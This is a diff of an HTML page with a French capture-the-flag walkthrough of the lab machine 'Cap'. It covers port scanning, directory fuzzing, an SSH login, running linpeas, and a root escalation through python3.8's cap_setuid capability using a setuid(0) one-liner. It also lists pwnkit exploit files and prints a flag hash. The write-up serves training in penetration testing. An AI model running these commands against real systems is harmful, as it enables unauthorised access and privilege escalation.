@@ -43,29 +43,29 @@
 
                             Donc, j'ai utilisé le flag ``-sS`` dans Nmap, pour ignitier la connection avec l'envoie de paquets. Si nmap reçoit la réponse, le port est considéré comme ouvert.
 
-                                ``sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v``
+                                ```sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v
 
-                                ````
+                                ```
                                 PORT   STATE   SERVICE   VERSION
                                 21 / tcp  open     ftp     vsftpd 3.0.3
                                 22 / tcp  open   ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
                                 80 / tcp  open    http    gunicorn
-                                ````
+                                ```
                 
 
                             ### Fuzzing de l'url avec Ffuf et Gobuster:
 
-                                ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1``
+                                ```ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1
 
-                                ``ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt``
+                                ```ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/dns/subdomains-top1million-5000.txt
 
                             #### Résultats obtenus:
 
-                                ``  
+                                ```
                                 /ip
                                 /netstat
                                 /data
-                                ``
+                                ```
 
                             ### Ensuite:
 
@@ -96,14 +96,14 @@
 
                             Je me suis servi de ce password afin de me connecter via SSH, avec le user 'nathan'.
                         
-                                ``ssh nathan@10.10.10.245``
+                                ```ssh nathan@10.10.10.245
 
 
                             On est dans la machine. 🖥️🖥️
                             
                             J'ai téléchargé Linpeas 🤔
                         
-                                ``
+                                ```
                                 nathan@cap:~$ **ls  
                                 e.py  linpeas  linpeas.sh  snap  user.txt  
                                 nathan@cap:~$ **cat user.txt**  
@@ -111,27 +111,27 @@
 
                                 nathan@cap:~/snap/bin$ **ls 
                                 Makefile  cve  cve-2021-4034.c  esc  exploit_nss.py  ls  polkit  pwnkit.c
-                                ``
+                                ```
 
                             J'ai rendu linpeas exécutable, et l'ai lancé.
 
-                                ``
+                                ```
                                 chmod +x linpeas
                                 chmod +x linpeas.sh
 
                                 ./linpeas
                                 ./linpeas.sh
-                                ``
+                                ```
                             Linpeas a indiqué dans la sortie, que python 3 disposait de la fonction 'cap_setuid' qui peut modifier l'UID d'un processus:
 
-                            ``/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip``
+                            ```/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip```
 
-                                ````
+                                ```
                                 nathan@cap:~$ ls
                                 snap  user.txt
                                 nathan@cap:~$ cat user.txt
                                 bd615fdf252a03b75214aebaa4cb0714
-                                ````
+                                ```
 
                                         3. **Accès root** : Escalade de privilèges via la création un fichier SUID .
 
@@ -139,9 +139,9 @@
                             J'en ai essayé plusieurs:
                             Cette commande m'as permise de passer de User à Root.
                     
-                            ``nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'``
+                            ```nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'```
 
-                            ````
+                            ```
                                 root@cap:~# ls
                                 snap  user.txt
                                 root@cap:~# cd /root
@@ -327,6 +327,7 @@
     </script>
 </body>
 </html>
+
 
 
 
